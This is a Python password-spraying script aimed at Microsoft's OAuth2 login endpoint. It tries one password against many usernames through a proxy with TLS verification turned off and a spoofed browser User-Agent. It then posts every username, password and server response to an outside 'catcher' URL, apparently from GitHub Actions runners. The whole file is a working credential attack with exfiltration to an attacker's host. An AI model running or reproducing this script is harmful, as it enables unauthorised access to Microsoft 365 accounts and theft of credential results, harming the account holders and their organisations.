import requests
import os
from urllib3.exceptions import InsecureRequestWarning

required_env_vars = ["USERNAMES", "PASSWORD", "CATCHERURL", "CATCHERTLS"]
missing_env_vars = [var for var in required_env_vars if os.getenv(var) is None]

if missing_env_vars:
    missing_vars_str = ", ".join(missing_env_vars)
    raise ValueError(f"Missing environment variables: {missing_vars_str}")

# Fetch environment variables
usernames = os.getenv("USERNAMES").split(',')
password = os.getenv("PASSWORD")
catcher_URL = os.getenv("CATCHERURL")
catcher_uses_TLS_str = os.getenv("CATCHERTLS")
proxy_host = os.getenv("PROXY_HOST", "127.0.0.1")
proxy_port = os.getenv("PROXY_PORT", "8080")
instance_id = os.getenv("INSTANCE_ID", "1")

# Convert catcher_uses_TLS_str to boolean
catcher_uses_TLS = catcher_uses_TLS_str.lower() == "true"

# Configure proxy
proxies = {
    'http': f'http://{proxy_host}:{proxy_port}',
    'https': f'http://{proxy_host}:{proxy_port}',  # HTTPS também vai pelo HTTP CONNECT
}

print(f"[*] Instance ID: {instance_id}")
print(f"[*] Using Thermoptic proxy at {proxy_host}:{proxy_port}")
print(f"[*] Processing {len(usernames)} usernames")

def send_login_request(username, password):
    url = "https://login.microsoft.com/common/oauth2/token"
    body_params = {
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "client_info": "1",
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "openid",
    }
    post_headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    
    try:
        response = requests.post(
            url,
            headers=post_headers,
            data=body_params,
            proxies=proxies,  # Usa o proxy Thermoptic
            verify=False,  # Thermoptic é um MITM proxy, precisa desabilitar SSL verification
            timeout=30,
        )
        return response.status_code, response.text
    except requests.RequestException as e:
        print(f"[-] Request failed for {username}: {str(e)}")
        return None, None

def send_data_to_catcher(data, use_ssl):
    if not use_ssl:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    try:
        # Envia dados do catcher SEM proxy (comunicação direta)
        response = requests.post(
            catcher_URL, 
            json=data, 
            timeout=10, 
            verify=use_ssl
        )
        print("[+] Data sent to the catcher.")
    except requests.RequestException as e:
        print(f"[-] Failed to send data to the catcher: {str(e)}")

# Disable SSL warnings para o proxy MITM
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Initialize an empty list to store results
results = []

# Iterate over each username and perform login request
for idx, username in enumerate(usernames, 1):
    print(f"[*] Testing {idx}/{len(usernames)}: {username}")
    
    login_response_code, login_response = send_login_request(username, password)
    
    result = {
        "username": username,
        "password": password,
        "instance_id": instance_id,
    }
    
    if login_response_code is not None and login_response is not None:
        result["status_code"] = login_response_code
        result["response"] = login_response
        print(f"[+] Response code: {login_response_code}")
    else:
        result["status_code"] = 500
        result["response"] = "Github actions workflow failed to perform login request"
        print(f"[-] Request failed for {username}")
    
    results.append(result)

# Send all results to the catcher
print(f"\n[*] Sending {len(results)} results to catcher...")
send_data_to_catcher(results, use_ssl=catcher_uses_TLS)
print("[*] Script completed!")
